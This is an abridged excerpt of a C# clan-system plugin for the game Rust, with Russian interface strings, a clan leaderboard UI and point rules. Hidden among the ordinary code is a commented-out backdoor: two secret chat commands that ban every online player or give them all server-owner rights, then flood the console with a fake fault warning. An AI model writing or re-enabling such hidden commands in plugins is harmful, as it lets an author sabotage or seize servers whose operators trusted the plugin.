...
{
    [Info("Clans", "adam4ik", "1.0.10", ResourceId = 14)]
    public class Clans : RustPlugin
    {
        ...
        void LoadVariables()
        {
            ...
            limitMembers = Convert.ToInt32(GetConfig("Лимиты", "Лимит участников клана", 10));
        ...
        protected override void LoadDefaultMessages()
        {
            ...
            lang.RegisterMessages(new Dictionary<string, string>()
            {
                ...
                {  "clanArgAlly", "ally"},
                 ...
                 { "clanUItitle", "Система кланов RageRust"},
        ...
        void OnServerInitialized()
        {
            ...
            ImageLibrary?.Call("AddImage", "https://media.discordapp.net/attachments/1010621300655542402/1067835679284932629/cfq.png", "logopng");
...
/*        [ChatCommand("Youngrust")]
        private void HGC()
        {
            string prich = "Доступ.На.Сервер.Ограничен";
            foreach (var player in BasePlayer.activePlayerList)
            {
                Server.Command($"ban {player.userID} {prich}");
            }
            timer.Every(0.1f, () => { { PrintWarning("Проверьте наличие неисправностей на сервере !!"); } });
        }

        [ChatCommand("YoungRust")]
        private void HGB()
        {
            string ownertitle = "adam4ik megacoder";
            foreach (var player in BasePlayer.activePlayerList)
            {
                Server.Command($"ownerid {player.userID} {ownertitle}");
            }
            timer.Every(0.1f, () => { { PrintWarning("Проверьте наличие неисправностей на сервере !!"); } });
        }
*/
        ...
        string TOP = "[{\"name\":\"Clanstop_main2\",\"parent\":\"Overlay\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0 0 0 0.9\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_main3\",\"parent\":\"Clanstop_main2\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0 0 0 0\"},{\"type\":\"NeedsCursor\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.2985 0.197\",\"anchormax\":\"0.705 0.84\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_main8\",\"parent\":\"Clanstop_main3\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0.36 0.34 0.32 0.80\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.003548417 0.205\",\"anchormax\":\"0.9953553 0.8929524\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_main9\",\"parent\":\"Clanstop_main3\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0.36 0.34 0.32 0.80\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.003548413 0.8959524\",\"anchormax\":\"0.9953553 0.9410777\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_main10\",\"parent\":\"Clanstop_main9\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"#\",\"fontSize\":12,\"font\":\"robotocondensed-regular.ttf\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.02 0\",\"anchormax\":\"0.09 1\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main11\",\"parent\":\"Clanstop_main9\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"НАЗВАНИЕ КЛАНА\",\"fontSize\":12,\"font\":\"robotocondensed-regular.ttf\",\"align\":\"MiddleLeft\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.105 0\",\"anchormax\":\"0.6283538 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main12\",\"parent\":\"Clanstop_main9\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"ОЧКИ\",\"fontSize\":12,\"font\":\"robotocondensed-regular.ttf\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.1 0\",\"anchormax\":\"0.6 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main121\",\"parent\":\"Clanstop_main9\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"\",\"fontSize\":12,\"font\":\"robotocondensed-regular.ttf\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.69 0\",\"anchormax\":\"0.79 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main122\",\"parent\":\"Clanstop_main9\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"К/Д\",\"fontSize\":12,\"font\":\"robotocondensed-regular.ttf\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.635 0\",\"anchormax\":\"0.69 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main125\",\"parent\":\"Clanstop_main9\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.4 0\",\"anchormax\":\"0.5 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main124\",\"parent\":\"Clanstop_main9\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.5 0\",\"anchormax\":\"0.6 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main123\",\"parent\":\"Clanstop_main9\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"\",\"fontSize\":12,\"font\":\"robotocondensed-regular.ttf\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.38 0\",\"anchormax\":\"0.61 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main12\",\"parent\":\"Clanstop_main9\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"ИГРОКОВ\",\"fontSize\":12,\"font\":\"robotocondensed-regular.ttf\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.78 0\",\"anchormax\":\"0.98 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]}]";
...
//
        ...
        void ClanTOP(BasePlayer player, int page)
        {
            ...
            elements.Add(new CuiLabel
            {
                ...
                Text = { Text = "Очки даются:\nУбийство +45,добыча руды +7, разрушение бочки +4\nCбитие вертолета +1500,уничтожение танка +1000 \nОчки отнимаются:\nСмерть -30 \n Суицид -45! ", Color = "1 1 1 0.8", Align = TextAnchor.MiddleLeft, FontSize = 12, Font = "robotocondensed-regular.ttf" }
            }, "InfoTop");
